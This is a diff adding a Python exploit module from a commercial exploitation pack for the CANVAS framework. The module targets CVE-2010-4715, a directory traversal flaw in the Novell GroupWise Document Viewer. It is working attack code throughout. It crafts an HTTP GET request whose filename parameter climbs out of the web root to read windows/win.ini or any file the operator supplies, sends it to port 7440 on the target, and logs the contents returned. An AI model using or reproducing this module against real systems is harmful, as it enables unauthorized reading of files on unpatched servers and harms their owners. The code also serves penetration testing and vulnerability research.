@@ -1,0 +1,105 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2011
+#
+
+import sys
+import re
+import random
+import time
+import thread
+import struct
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from libs.spkproxy import header, body
+from libs.canvasos import *
+import libs.spkproxy as spkproxy
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "Novell GroupWise Document Viewer Directory Traversal Vulnerability"
+DESCRIPTION = "Directory traversal vulnerability in Novell GroupWise Document Viewer"
+VERSION = "0.1"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Novell"
+DOCUMENTATION["Date public"] = "2010.11.08"
+DOCUMENTATION["VersionsAffected"] = "Novell GroupWise 8"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/44732"
+DOCUMENTATION["CVE Name"] = "CVE-2010-4715"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4715"
+DOCUMENTATION["Notes"] = ""
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES = ""
+
+CHANGELOG = ""
+
+	
+class theexploit(tcpexploit):
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.setInfo(DESCRIPTION)
+		self.name = NAME       
+		self.port = 7440
+		self.version = 0		
+		self.filename = "../../../../../../../../../../windows/win.ini"
+		return
+
+    	        
+	def run(self):		
+		# Check arguments
+		self.host = self.target.interface
+		self.port = self.argsDict.get("port", self.port)
+		self.filename = self.argsDict.get("filename", self.filename)
+					               
+		self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))                
+		self.log("Attacking %s:%d"%(self.host, self.port))                	
+
+		sploitstring = "GET /log?filename=%s HTTP/1.1\r\n" % self.filename
+		sploitstring += "Host: %s:%d\r\n" % (self.host, self.port)
+		sploitstring += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n"		
+		sploitstring += "\r\n"			             
+		
+		try:
+		  s = self.gettcpsock()
+		  s.connect((self.host, self.port))
+		  self.websend(s, sploitstring)
+		  data = self.webrecv(s)
+		except:
+		  self.log("[D2] connection error (host:%s port:%d ssl:%d" % (self.host,self.port,self.ssl))        		  
+		
+		self.log(data)		
+                		          
+		self.setInfo('[D2] %s attacking %s:%d - done' % (NAME, self.host, self.port))
+						            
+		return 1            
+       
+			  		
+	def usage(self):        
+		print "Usage: %s -v version -t targethost -l localip -d localport [-O ssl:0|1] [-O filename:filename]\n" % sys.argv[0]					
+		sys.exit(0) 
+
+
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
